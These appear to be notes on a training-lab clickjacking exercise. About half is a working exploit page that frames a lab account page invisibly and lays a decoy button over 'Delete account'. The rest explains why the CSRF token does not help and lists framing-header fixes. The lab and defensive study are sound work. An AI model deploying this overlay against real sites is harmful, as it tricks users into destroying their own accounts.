# Clickjacking

## Lab: Basic clickjacking with CSRF token protection

**Goal:** trick a logged-in user into deleting their own account by overlaying a transparent copy of the target page on top of a decoy

The target account page can be loaded inside an `<iframe>` from any origin. The exploit page frames `/my-account`, makes the frame nearly invisible, and positions a decoy element directly over the real "Delete account" button, so a click on the decoy lands on the hidden button

**Exploit page:**

```html
<style>
  iframe {
    position: relative;
    width: 700px;
    height: 600px;
    opacity: 0.0001;
    z-index: 2;
  }
  div {
    position: absolute;
    top: 508px;
    left: 70px;
    z-index: 1;
  }
</style>
<div>Click me</div>
<iframe src="https://LAB-ID.web-security-academy.net/my-account"></iframe>
```

Method: Adjust the decoy's `top` / `left` until "Click me" covers "Delete account Because the victim is already authenticated, their own session (and CSRF token) is used when the framed button is clicked, which is why the token alone does not stop this

**Root cause:** the target does not restrict who is allowed to frame it, so a malicious site can embed it and overlay its own UI. A CSRF token doesn't protect against a real click the user was deceived into making

## Remediation

- **`X-Frame-Options: DENY`** (or `SAMEORIGIN`) to stop the page being framed by other origins. This is the header my domain-scanner flagged as missing on the client sites
- **`Content-Security-Policy: frame-ancestors 'none'`** (or an allowlist) as the modern equivalent
